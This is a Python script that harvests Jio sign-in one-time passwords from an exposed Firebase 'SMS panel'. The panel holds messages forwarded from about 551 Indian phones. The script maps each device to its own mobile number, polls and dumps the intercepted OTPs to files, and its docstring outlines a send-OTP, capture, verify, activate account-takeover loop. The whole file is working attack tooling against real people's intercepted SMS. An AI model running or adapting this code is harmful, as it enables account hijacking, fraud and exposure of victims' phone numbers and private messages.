#!/usr/bin/env python3
"""rtx_harvester.py — OTP harvester for the rtx-c9 SMS panel.

The rtx-c9 panel (asia-southeast1) holds 551 Indian devices with live SMS
forwarding.  376 of them expose their own mobile number in the `info` field of
forwarded SMS.  Jio sign-in OTPs arrive on those numbers and land in the panel
within seconds, so the harvest loop is: send OTP -> poll the device's smsData
for a fresh Jio OTP -> verify -> activation URL.

Node layout (differs from gas3):
    /data/<deviceId>/smsData/<msgId>/{info, message, sender, time}
    /data/<deviceId>/simInfo/...   (when present)
"""

from __future__ import annotations

import json
import re
import sys
import time
from pathlib import Path

import requests

DATA = Path(__file__).resolve().parent / "data"
BASE = "https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

# Jio sign-in OTP senders seen in this panel
JIO_SENDERS = ("JE-JIONET-S", "JX-JIONET-S", "JD-JIOFPS-S", "JIO-JIONET")
OTP_RE = re.compile(r"\b(\d{6})\b")


class RtxHarvester:
    def __init__(self, base: str = BASE):
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": UA})
        self.base = base

    def devices(self) -> dict:
        """deviceId -> sorted list of that device's own mobile numbers."""
        d = self.s.get(f"{self.base}/data.json", timeout=120).json()
        out = {}
        for dev, rec in d.items():
            if not isinstance(rec, dict):
                continue
            nums = set()
            for sms in (rec.get("smsData") or {}).values():
                if not isinstance(sms, dict):
                    continue
                m = re.search(r"Number\s*:\s*\+?91?([6-9]\d{9})",
                              sms.get("info", ""))
                if m:
                    nums.add(m.group(1))
            if nums:
                out[dev] = sorted(nums)
        return out

    def device_sms(self, dev: str) -> list[dict]:
        try:
            r = self.s.get(f"{self.base}/data/{dev}/smsData.json", timeout=30)
            if r.status_code != 200 or not isinstance(r.json(), dict):
                return []
        except requests.RequestException:
            return []
        rows = []
        for mid, sms in r.json().items():
            if isinstance(sms, dict):
                rows.append({"id": mid, **sms})
        return rows

    def wait_for_otp(self, dev: str, mobile: str, timeout: int = 70,
                     poll: int = 3) -> str | None:
        """Poll one device until a Jio OTP for `mobile` shows up."""
        deadline = time.time() + timeout
        seen: set[str] = set()
        # seed with existing ids so we only report NEW messages
        for row in self.device_sms(dev):
            seen.add(row["id"])
        while time.time() < deadline:
            for row in self.device_sms(dev):
                if row["id"] in seen:
                    continue
                seen.add(row["id"])
                sender = (row.get("sender") or "").upper()
                msg = row.get("message") or ""
                if not any(j in sender for j in JIO_SENDERS):
                    continue
                if mobile[-10:] not in (row.get("info") or "") and \
                        mobile[-10:] not in msg:
                    # OTP must belong to this number
                    if mobile[-10:] not in msg:
                        continue
                m = OTP_RE.search(msg)
                if m:
                    return m.group(1)
            time.sleep(poll)
        return None

    def newest_jio_otp(self, dev: str) -> tuple[str, str, str] | None:
        """Most recent Jio OTP already sitting in the device (no send needed)."""
        rows = self.device_sms(dev)
        rows.sort(key=lambda r: r.get("time", ""), reverse=True)
        for row in rows[:25]:
            sender = (row.get("sender") or "").upper()
            if not any(j in sender for j in JIO_SENDERS):
                continue
            m = OTP_RE.search(row.get("message") or "")
            if m:
                return m.group(1), row.get("time", ""), row.get("sender", "")
        return None


def main() -> int:
    h = RtxHarvester()
    print("[*] loading devices from rtx-c9 ...")
    devs = h.devices()
    print(f"[*] {len(devs)} devices with own number")
    DATA.mkdir(parents=True, exist_ok=True)
    (DATA / "rtx_c9_dev_mobile.json").write_text(json.dumps(devs, indent=1))

    # dump every Jio OTP currently sitting in the panel
    found = []
    for dev, nums in devs.items():
        r = h.newest_jio_otp(dev)
        if r:
            otp, ts, sender = r
            found.append({"dev": dev, "mobiles": nums, "otp": otp,
                          "time": ts, "sender": sender})
            print(f"  {dev[:16]} {nums} -> OTP {otp} @ {ts} ({sender})")
    found.sort(key=lambda x: x["time"], reverse=True)
    (DATA / "rtx_c9_otps.json").write_text(json.dumps(found, indent=1))
    print(f"[*] {len(found)} devices carry a Jio OTP")
    return 0


if __name__ == "__main__":
    sys.exit(main())
